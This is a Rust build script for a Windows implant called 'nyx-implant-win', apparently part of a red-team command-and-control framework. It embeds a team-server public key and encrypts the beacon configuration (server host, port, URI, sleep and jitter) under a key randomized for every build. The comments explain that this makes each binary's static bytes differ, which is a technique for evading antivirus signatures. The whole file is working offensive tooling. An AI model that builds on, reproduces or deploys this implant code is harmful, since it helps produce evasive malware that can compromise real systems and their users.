//! Build script for nyx-implant-win.
//!
//! Two compile-time bakes:
//!
//! 1. **Team server long-term X25519 public key** (`OUT_DIR/server_pub.rs`) —
//!    see `bake_server_pub`. Source (first match wins):
//!      a. `NYX_SERVER_PUB` env (64 hex chars).
//!      b. A clearly-marked dev fallback key (NOT for production, but a real
//!         non-identity X25519 point so the ECDH doesn't collapse).
//!
//! 2. **Per-build encrypted config** (`OUT_DIR/config_blob.rs`) — see
//!    `bake_config`. Reads a TOML-ish config file (default `config.toml` next
//!    to this crate, override with `NYX_CONFIG`), serializes it into a compact
//!    binary blob (length-prefixed fields the runtime `wire::Reader` decodes),
//!    and emits a `pub static CONFIG_BLOB: &[u8] = &[...];`. At runtime
//!    `config::load()` decrypts it (via `nyx_config_macros::embed!`) and parses
//!    it back into a `Config`.
//!
//!    The blob emitted here is the PLAINTEXT; the per-build encryption happens
//!    through `embed!` in the generated file. So every rebuild re-randomizes
//!    the key/nonce/offset even if the config values are identical — the static
//!    bytes (and surrounding instruction layout) differ per build.

use std::env;
use std::fs;
use std::path::Path;

fn main() {
    println!("cargo:rerun-if-env-changed=NYX_SERVER_PUB");
    println!("cargo:rerun-if-env-changed=NYX_CONFIG");

    bake_server_pub();
    bake_config();
}

// ---- 1. server pubkey -----------------------------------------------------

fn bake_server_pub() {
    let key_bytes: [u8; 32] = match env::var("NYX_SERVER_PUB") {
        Ok(hexstr) => decode_pubkey(&hexstr).unwrap_or_else(|| {
            panic!(
                "NYX_SERVER_PUB must be 64 hex chars (32 bytes); got {} chars",
                hexstr.len()
            )
        }),
        Err(_) => {
            // Development fallback: a fixed, publicly-known test keypair. This
            // is NOT secret and must NEVER be used in an engagement — but it's
            // a real (non-identity) X25519 point, so the crypto is structurally
            // exercised instead of collapsing. Real builds set NYX_SERVER_PUB.
            [
                0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
                0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
                0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
            ]
        }
    };

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("server_pub.rs");
    let mut src = String::from("/// Team server long-term X25519 public key, baked at build time.\n");
    src.push_str("/// See build.rs. Do not edit by hand.\n");
    src.push_str("pub static SERVER_PUB: [u8; 32] = [");
    for (i, b) in key_bytes.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\n");
    fs::write(&dest, src).unwrap();
}

// ---- 2. per-build config --------------------------------------------------

/// The dev defaults, used when no config file is present (or a field is
/// missing). Matches the old `beacon.rs::load_config()` values so an unset
/// build behaves identically to before.
struct Defaults;
impl Defaults {
    const HOST: &'static str = "127.0.0.1";
    const PORT: u16 = 8443;
    const URI: &'static str = "/beacon";
    const SLEEP: u32 = 5;
    const JITTER: u8 = 20;
    const TLS: bool = false;
}

fn bake_config() {
    // Resolve the config file: NYX_CONFIG env, else config.toml next to
    // Cargo.toml (CARGO_MANIFEST_DIR). Missing file → all dev defaults.
    let manifest = env::var("CARGO_MANIFEST_DIR").unwrap();
    let default_path = Path::new(&manifest).join("config.toml");
    let path = match env::var("NYX_CONFIG") {
        Ok(p) => Path::new(&p).to_path_buf(),
        Err(_) => default_path,
    };

    let text = fs::read_to_string(&path).ok();
    let cfg = parse_config(text.as_deref());

    // Serialize into the binary blob the runtime `wire::Reader` decodes.
    // Layout: str(host) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
    // (matches config::Config::decode). str = u32-LE length prefix + bytes.
    let mut blob: Vec<u8> = Vec::new();
    write_str(&mut blob, cfg.host.as_bytes());
    write_u16(&mut blob, cfg.port);
    write_str(&mut blob, cfg.uri.as_bytes());
    write_u32(&mut blob, cfg.sleep_seconds);
    blob.push(cfg.jitter_pct);
    blob.push(u8::from(cfg.use_tls));

    let out_dir = env::var("OUT_DIR").unwrap();

    // Encrypt the plaintext config blob under a FRESH per-build
    // ChaCha20-Poly1305 key+nonce (build.rs runs on the host, std, so we use
    // nyx_config::encrypt directly). Emit the key/nonce/ciphertext as a Rust
    // static the runtime `config.rs` decrypts. This is the same scheme
    // `nyx_config_macros::embed!` performs, but inlined here so we avoid the
    // proc-macro's "string literal path" requirement (OUT_DIR is only known
    // via env!(), not a literal). Every build re-randomizes key/nonce → the
    // static config bytes differ every build even with identical config values.
    let (key, nonce, ct) = nyx_config::encrypt(&blob);
    let dest = Path::new(&out_dir).join("config_blob.rs");
    let mut src = String::new();
    src.push_str("/// Per-build encrypted implant config, baked by build.rs.\n");
    src.push_str("/// Do not edit by hand — key/nonce/ciphertext are randomized per build.\n");
    src.push_str("pub static CONFIG_KEY: [u8; 32] = [");
    for (i, b) in key.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\npub static CONFIG_NONCE: [u8; 12] = [");
    for (i, b) in nonce.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\npub static CONFIG_CT: &[u8] = &[");
    for (i, b) in ct.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\n");
    fs::write(&dest, src).unwrap();
    // Re-run if the source config file changes.
    println!("cargo:rerun-if-changed={}", path.display());
}

struct ConfigVals {
    host: String,
    port: u16,
    uri: String,
    sleep_seconds: u32,
    jitter_pct: u8,
    use_tls: bool,
}

/// Minimal TOML-ish parser. Only understands `key = "value"` (strings) and
/// `key = <int>`/`key = true|false`. Comments (`#`) and blank lines skipped.
/// Unknown keys ignored. Missing keys fall back to Defaults.
fn parse_config(text: Option<&str>) -> ConfigVals {
    let mut host = String::from(Defaults::HOST);
    let mut port = Defaults::PORT;
    let mut uri = String::from(Defaults::URI);
    let mut sleep_seconds = Defaults::SLEEP;
    let mut jitter_pct = Defaults::JITTER;
    let mut use_tls = Defaults::TLS;

    if let Some(t) = text {
        for raw in t.lines() {
            let line = raw.split('#').next().unwrap_or("").trim();
            if line.is_empty() {
                continue;
            }
            let Some((k, v)) = line.split_once('=') else {
                continue;
            };
            let key = k.trim();
            let val = v.trim();
            match key {
                "server_host" => {
                    if let Some(s) = unquote(val) {
                        host = s;
                    }
                }
                "beacon_uri" => {
                    if let Some(s) = unquote(val) {
                        uri = s;
                    }
                }
                "server_port" => {
                    if let Ok(n) = val.parse() {
                        port = n;
                    }
                }
                "sleep_seconds" => {
                    if let Ok(n) = val.parse() {
                        sleep_seconds = n;
                    }
                }
                "jitter_pct" => {
                    if let Ok(n) = val.parse() {
                        jitter_pct = n;
                    }
                }
                "use_tls" => {
                    if val == "true" {
                        use_tls = true;
                    } else if val == "false" {
                        use_tls = false;
                    }
                }
                _ => {}
            }
        }
    }

    ConfigVals {
        host,
        port,
        uri,
        sleep_seconds,
        jitter_pct,
        use_tls,
    }
}

/// Strip surrounding double-quotes from a TOML basic string value, if present.
fn unquote(v: &str) -> Option<String> {
    let v = v.trim();
    if v.len() >= 2 && v.starts_with('"') && v.ends_with('"') {
        Some(v[1..v.len() - 1].to_string())
    } else {
        None
    }
}

fn write_u16(buf: &mut Vec<u8>, v: u16) {
    buf.extend_from_slice(&v.to_le_bytes());
}

fn write_u32(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_le_bytes());
}

fn write_str(buf: &mut Vec<u8>, s: &[u8]) {
    write_u32(buf, s.len() as u32);
    buf.extend_from_slice(s);
}

// ---- shared helpers -------------------------------------------------------

fn decode_pubkey(s: &str) -> Option<[u8; 32]> {
    if s.len() != 64 {
        return None;
    }
    let mut out = [0u8; 32];
    for (i, chunk) in s.as_bytes().chunks(2).enumerate() {
        let hi = hex_nibble(chunk[0])?;
        let lo = hex_nibble(chunk[1])?;
        out[i] = (hi << 4) | lo;
    }
    Some(out)
}

fn hex_nibble(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}
